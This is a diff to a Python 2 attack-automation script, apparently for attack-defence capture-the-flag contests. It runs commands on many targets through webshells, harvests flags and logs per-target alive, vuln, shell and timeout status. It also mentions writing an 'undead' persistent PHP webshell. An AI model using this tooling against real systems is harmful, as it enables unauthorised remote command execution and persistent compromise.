@@ -13,15 +13,25 @@ from optparse import OptionParser
 
 
 def attack(target,target_port,cmd,get_flag):
-    global headers
+    global headers,targets_status
     is_vuln = 1
+    is_shell = True
+    is_alive = 1
     flag = "hello world!"
     info = "success"
     reserve = 0    
     if options.random_ua:
 	headers['User-Agent'] = random_ua()    
-
-    if check_shell(target,target_port,""):
+    is_shell = check_shell(target,target_port,"")
+    if is_shell=='timeout':
+	if '.php' in cmd and shell_type==2:
+	    dump_info("Writting undead php webshell")
+	else:
+	    dump_error("connect timeout",target+":"+str(target_port),"function.py check_shell")
+	    write_specific_log(target,target_port,"[-] connect timeout")
+	    is_alive = 0
+	    res = "timeout"
+    elif is_shell:
 	dump_success("check_shell success",target+":"+str(target_port),"function.py check_shell")
 	write_specific_log(target,target_port,"[+] check shell success")
 	res = execute_shell(target,target_port,cmd)
@@ -47,7 +57,18 @@ def attack(target,target_port,cmd,get_flag):
 	dump_success("execution cmd",target+":"+str(target_port),"run.py")
 	write_specific_log(target,target_port,"[+] execute cmd success")
     dump_context(res)
-
+    
+    now_status =  (target + ":" + target_port).ljust(32," ")
+    if is_alive:
+	now_status += "|alive|"
+	if is_vuln:
+	    now_status += "|vuln|"
+	if is_shell:
+	    now_status += "|shell|"
+    else:
+	now_status += '|timeout|'
+    now_status += '\n'
+    targets_status += now_status 
     return flag,is_vuln,info,reserve 
 
 def run():
@@ -84,7 +105,7 @@ def run():
             flag,is_vuln,info,reserve = attack(target,target_port,cmd,run_for_flag)
 	except Exception,e:
 	    debug_print(traceback.format_exc())
-	    dump_error(str(e),target,load_script)
+	    dump_error(str(e),target,"run.py")
 	
 	#set the return value reverse => 0 and is_vuln => 1 and the flag has  been changed, post the flag.
 	if not reserve and  is_vuln and flag!="hello world!":
@@ -106,8 +127,6 @@ def run():
 	print ""
 	print ""
 	print ""
-    dump_info("sleeping ...")
-    time.sleep(script_runtime_span)
 		 
 def banner():
     my_banner = ""
@@ -167,6 +186,10 @@ if __name__ == '__main__':
     while loop_count > 0:
         try:
 	    run()
+	    record_status(targets_status)
+	    targets_status = ''
+	    dump_info("sleeping ...")
+	    time.sleep(script_runtime_span)
         except  KeyboardInterrupt:
 	    dump_error("Program stoped by user, existing...")
 	    exit()
